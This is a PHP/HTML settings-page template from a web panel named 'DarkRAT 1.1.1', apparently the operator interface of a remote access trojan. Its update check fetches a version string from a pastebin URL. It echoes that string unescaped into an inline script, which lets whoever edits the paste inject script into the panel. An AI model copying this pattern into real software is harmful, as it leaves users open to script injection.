<div class="page-content" style="padding-bottom: 70px;">
        <!-- Page Header-->

        <!-- Breadcrumb-->
        <div class="container-fluid">
          <ul class="breadcrumb">
            <li class="breadcrumb-item"><a href="?p=dashboard">DarkRat</a></li>
            <li class="breadcrumb-item active">Settings            </li>
          </ul>
        </div>
        <section class="no-padding-top">
          <div class="container-fluid">
           

           <div id="settings">
           </div>



      <hr>

          <div id="update">
            <div id="json-object" class="panel-group">
              <div class="panel panel-success">
                  <div class="panel-heading">
                    <h4 class="panel-title">
                        <a data-toggle="collapse" href="#collapse-form1">
                        Update</a>
                    </h4>
                  </div>
                  <div id="collapse-form1" class="panel-collapse collapse in">
                    <div class="panel-body">
                        <br>
                        <form method="POST">
                            <label>DarkRAT 1.1.1
                            <?php
                            $thisVersion= "1.1.1";
                            if(isset($_POST["checkupdate"])){
                                $latestVersion = file_get_contents("https://pastebin.com/raw/YBGEBviB");
                                if(  $thisVersion == $latestVersion){
                                    echo "<script>document.addEventListener('DOMContentLoaded', function() { toastr.info('This UI is up to date!')  });  </script> ";
                                }else{
                                  echo "<script>document.addEventListener('DOMContentLoaded', function() { toastr.warning('Update Found ".$latestVersion." you are on ".$thisVersion."!') });</script>  ";
                                }
                              }

                            ?>
                             </label> <br><button type="submit" name="checkupdate" value="true" class="btn btn-dark">  Check Update</button>
                        </form>


                    </div>
                  </div>
              </div>
            </div>
          </div>


<?php
/*
        Latest Version : <small> echo file_get_contents("https://pastebin.com/raw/YBGEBviB"); </small> <br>
        Your version: <small> 1.1.1</small>

*/
?>

          </div>
        </section>
